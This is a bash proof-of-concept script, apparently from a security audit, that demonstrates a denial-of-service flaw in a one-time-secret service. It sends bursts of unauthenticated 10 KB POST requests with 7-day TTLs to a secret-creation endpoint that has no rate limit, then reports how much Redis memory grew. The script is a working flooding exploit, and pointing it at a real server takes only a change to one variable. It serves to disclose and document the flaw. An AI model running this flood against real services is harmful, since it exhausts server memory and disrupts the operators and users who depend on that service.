#!/usr/bin/env bash
# PoC 02 — M-7: unauthenticated Redis exhaustion via unthrottled secret creation
#
# There is no rate limiter on the conceal path (see
# lib/onetime/operations/ratelimit/registry.rb — 'conceal' is absent). Each
# unauthenticated request writes ~16 KB to Redis that persists for up to 7 days.
#
# Usage: ./02-conceal-flood-dos.sh [count]   (default 200)
set -euo pipefail
BASE="${BASE:-http://127.0.0.1:3000}"
N="${1:-200}"
PAYLOAD=$(python3 -c "print('A'*10000)")   # SECRET_MAX_LENGTH default

echo "=== before ==="
redis-cli info memory | grep used_memory_human
echo -n "keys: "; redis-cli -n 0 dbsize

echo "=== $N unauthenticated POSTs, 10 KB each, ttl=604800 (anonymous max) ==="
for i in $(seq 1 "$N"); do
  curl -sS -m 10 -o /dev/null -X POST "$BASE/api/v2/secret/conceal" \
    -H 'Content-Type: application/json' \
    -d "{\"secret\":{\"secret\":\"$PAYLOAD\",\"ttl\":604800}}" &
  (( i % 20 )) || wait
done
wait

echo "=== after ==="
redis-cli info memory | grep used_memory_human
echo -n "keys: "; redis-cli -n 0 dbsize
echo "=== sample TTL (expect ~604800 = 7 days) ==="
redis-cli -n 0 --scan --pattern 'secret:*:object' | head -1 \
  | while read -r k; do echo "$k -> $(redis-cli -n 0 ttl "$k")"; done

echo
echo "Observed on 2026-08-14: 1.63M/107 keys -> 4.83M/508 keys for 200 requests."
echo "Extrapolated: ~16 KB of 7-day-persistent Redis per unauthenticated request."
